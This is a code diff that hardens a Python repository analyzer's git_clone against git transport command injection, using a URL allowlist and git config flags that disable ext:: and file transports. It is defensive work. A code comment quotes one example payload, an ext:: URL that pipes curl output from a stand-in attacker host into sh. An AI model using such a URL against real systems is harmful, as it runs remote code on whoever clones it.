@@ -157,10 +157,59 @@ class RepoAnalyzer:
 
         return result
 
+    # URL schemes allowed for ``git_clone``. ``ext::`` is excluded because
+    # git's ext transport executes arbitrary shell commands (e.g.
+    # ``ext::sh -c 'curl attacker|sh' %s %s``) BEFORE our pre-install audit
+    # gate (introduced v7.0.1) ever sees the cloned content. ``file://`` is
+    # excluded because it bypasses network controls and can read arbitrary
+    # local paths. See S29 handoff / v7.0.6 CHANGELOG.
+    _GIT_ALLOWED_URL_PREFIXES: tuple[str, ...] = (
+        "https://",
+        "git@",
+        "ssh://git@",
+    )
+
+    @classmethod
+    def _is_safe_git_url(cls, url: str) -> bool:
+        """Return True iff ``url`` is on the git URL allowlist.
+
+        Defends against the ``ext::`` RCE primitive (git transport command
+        injection). ``::`` is rejected anywhere in the URL because the
+        ``ext::`` transport marker can be preceded by aliases.
+        """
+        if not url:
+            return False
+        if "::" in url:
+            return False
+        return url.startswith(cls._GIT_ALLOWED_URL_PREFIXES)
+
     def git_clone(self, url: str, dest: Path) -> bool:
+        if not self._is_safe_git_url(url):
+            logger.warning(
+                "Refusing git clone of URL with disallowed scheme: %r "
+                "(only %s are allowed; ext:: and file:: are blocked to "
+                "prevent transport-level RCE)",
+                url,
+                self._GIT_ALLOWED_URL_PREFIXES,
+            )
+            return False
         try:
             subprocess.run(
-                ["git", "clone", "--depth", "1", url, str(dest)],
+                [
+                    "git",
+                    "clone",
+                    "--depth",
+                    "1",
+                    # Belt-and-suspenders: even if a future contributor
+                    # relaxes the URL allowlist, the protocol.ext.allow=never
+                    # config blocks the ext:: transport at the git level.
+                    "-c",
+                    "protocol.ext.allow=never",
+                    "-c",
+                    "protocol.file.allow=user",
+                    url,
+                    str(dest),
+                ],
                 check=True, capture_output=True, text=True, timeout=60,
             )
             return True
